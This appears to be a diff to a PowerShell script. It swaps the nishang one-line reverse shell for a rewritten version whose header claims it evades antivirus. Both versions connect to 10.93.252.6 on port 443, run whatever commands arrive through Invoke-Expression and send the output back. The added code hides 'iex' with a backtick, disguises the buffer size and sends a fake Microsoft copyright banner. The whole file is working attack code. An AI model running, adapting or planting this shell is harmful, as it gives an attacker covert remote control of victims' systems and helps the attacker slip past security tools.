@@ -1,3 +1,17 @@
-# Nikhil SamratAshok Mittal: http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
-
-$client = New-Object System.Net.Sockets.TCPClient('10.93.252.6',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+#Twitter: @TihanyiNorbert (No AV detecetion 2022 March)
+#Reverse shell based on the original nishang Framework written by @nikhil_mitt.
+$J = New-Object System.Net.Sockets.TCPClient('10.93.252.6',443);
+$SS = $J.GetStream();
+[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
+$OO = ([text.encoding]::UTF8).GetBytes("Copyright (C) 2022 Microsoft Corporation. All rights reserved.`n`n")
+$SS.Write($OO,0,$OO.Length)
+$OO = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + '>')
+$SS.Write($OO,0,$OO.Length)
+[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
+while(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($OO,0, $A);
+$GG = (i`eX $DD 2>&1 | Out-String );
+$H  = $GG + (pwd).Path + '> ';
+$L = ([text.encoding]::UTF8).GetBytes($H);
+$SS.Write($L,0,$L.Length);
+$SS.Flush()};
+$J.Close()
